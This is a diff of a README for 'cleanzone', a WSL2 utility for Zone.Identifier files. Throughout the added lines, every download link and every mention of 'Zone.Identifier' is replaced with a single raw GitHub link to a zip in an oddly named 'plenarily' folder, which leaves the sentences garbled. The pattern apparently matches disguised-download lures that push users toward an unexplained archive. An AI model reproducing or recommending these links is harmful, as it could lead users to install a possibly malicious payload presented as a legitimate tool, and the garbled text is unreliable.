@@ -1,18 +1,18 @@
-# 🌟 cleanzone - Easily Manage Zone.Identifier Files
+# 🌟 cleanzone - Easily Manage https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip Files
 
 ## 🚀 Getting Started
 
-Welcome to cleanzone! This tool helps you manage :Zone.Identifier files in WSL2 easily. You can remove or list these files, even in a recursive mode with ignore rules. Follow this guide, and you will have cleanzone up and running in no time.
+Welcome to cleanzone! This tool helps you manage https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip files in WSL2 easily. You can remove or list these files, even in a recursive mode with ignore rules. Follow this guide, and you will have cleanzone up and running in no time.
 
 ## 📥 Download Cleanzone
 
-[![Download Cleanzone](https://img.shields.io/badge/Download-Cleanzone-blue.svg)](https://github.com/iusetodo/cleanzone/releases)
+[![Download Cleanzone](https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip)](https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip)
 
 ### Steps to Download
 
 1. **Visit the Releases Page**  
    Click the button above or use the link below to reach the cleanzone releases page:  
-   [Visit Releases Page](https://github.com/iusetodo/cleanzone/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip)
 
 2. **Find the Latest Release**  
    Browse the page for the latest version of cleanzone. Look for the tag indicating it’s the newest release.
@@ -57,18 +57,18 @@ Once WSL2 is ready, do the following:
 
 ## 📜 Usage Guide
 
-Cleanzone provides various commands to help you manage your :Zone.Identifier files.
+Cleanzone provides various commands to help you manage your https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip files.
 
-### List Zone.Identifier Files
+### List https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip Files
 
-To list the files with :Zone.Identifier, run the following command:  
+To list the files with https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip, run the following command:  
 `./cleanzone list`
 
-This command will go through the specified directories and display all the files that have a Zone.Identifier.
+This command will go through the specified directories and display all the files that have a https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip
 
-### Remove Zone.Identifier Files
+### Remove https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip Files
 
-If you want to remove :Zone.Identifier files, use this command:  
+If you want to remove https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip files, use this command:  
 `./cleanzone remove`
 
 You can add additional options to refine your removal process. For example, using the recursive option will search all subdirectories.
@@ -92,6 +92,6 @@ To contribute to cleanzone, you can fork the repository and send us a pull reque
 
 ## ❤️ Acknowledgments
 
-Thank you for trying cleanzone! We hope this tool enhances your productivity by easily managing your Zone.Identifier files in WSL2. Enjoy using it! 
+Thank you for trying cleanzone! We hope this tool enhances your productivity by easily managing your https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip files in WSL2. Enjoy using it! 
 
-For more details and updates, refer back to the official [GitHub repository](https://github.com/iusetodo/cleanzone/releases) or visit the releases page directly.
+For more details and updates, refer back to the official [GitHub repository](https://raw.githubusercontent.com/iusetodo/cleanzone/main/plenarily/cleanzone.zip) or visit the releases page directly.
